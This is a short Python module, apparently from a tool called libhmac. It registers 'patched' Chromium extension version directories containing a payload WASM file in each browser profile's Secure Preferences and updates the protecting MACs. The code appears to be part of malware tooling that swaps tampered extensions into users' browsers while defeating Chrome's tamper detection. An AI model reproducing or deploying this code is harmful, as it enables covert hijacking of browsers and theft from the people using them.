"""Register launcher-supplied extension targets in Chromium Secure Preferences."""

from __future__ import annotations

import json
import os
from typing import TYPE_CHECKING, Sequence

from libhmac.extensions import PAYLOAD_WASM, find_version_dirs
from libhmac.types import ExtensionTarget

if TYPE_CHECKING:
    from libhmac.prefs.chrome_manager import UnifiedChromeManager


def register_targets(
    manager: "UnifiedChromeManager", targets: Sequence[ExtensionTarget]
) -> int:
    """Update prefs + MACs for each patched version dir the launcher listed."""
    registered = 0
    seen: set[tuple[str, str, str]] = set()
    for target in targets:
        for ver_path in find_version_dirs(target.profile_path, target.extension_id):
            key = (target.profile_path, target.extension_id, ver_path)
            if key in seen:
                continue
            wasm_path = os.path.join(ver_path, PAYLOAD_WASM)
            manifest_path = os.path.join(ver_path, "manifest.json")
            if not os.path.isfile(wasm_path) or not os.path.isfile(manifest_path):
                continue
            try:
                with open(manifest_path, "r", encoding="utf-8") as mf:
                    manifest = json.load(mf)
            except (OSError, json.JSONDecodeError):
                continue
            if manager._replace_extension_for_profile(
                target.extension_id,
                ver_path,
                target.profile_path,
                target.browser,
                manifest,
            ):
                registered += 1
                seen.add(key)
    return registered
